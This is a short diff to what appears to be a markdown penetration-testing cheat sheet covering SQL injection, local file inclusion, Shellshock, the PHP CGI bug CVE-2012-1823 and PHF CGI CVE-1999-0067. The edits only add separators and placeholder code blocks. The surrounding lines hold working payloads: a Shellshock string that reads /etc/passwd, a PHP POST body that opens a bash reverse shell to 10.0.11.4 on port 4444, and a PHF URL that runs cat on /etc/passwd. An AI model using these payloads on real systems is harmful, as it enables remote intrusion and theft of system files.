@@ -7,6 +7,9 @@
 
 ## SQL Injection
 
+....
+
+----------------
 # Local File Inclusion (LFI)
 In versions of PHP below 5.3 can terminate with a null byte
 ```
@@ -15,7 +18,9 @@ In versions of PHP below 5.3 can terminate with a null byte
 
 ## Enumerating LFI
 
-
+```
+...
+```
 
 ## Exfiltrate Linux Files
 ```
@@ -50,7 +55,7 @@ In versions of PHP below 5.3 can terminate with a null byte
 ```
 () { :;}; echo $(</etc/passwd)
 ```
-
+----------------
 **Detect / Exploit PHP CGI Bug - [CVE-2012-1823]**
 <br/>
 _Detection:_
@@ -68,7 +73,7 @@ _POST Body Reverse TCP Shell_
 ```
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.11.4/4444 0>&1'");die; ?>
 ```
-
+----------------
 **PHF CGI Remote Command Execution - [CVE-1999-0067]**
 ```
 http://www.thesite.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
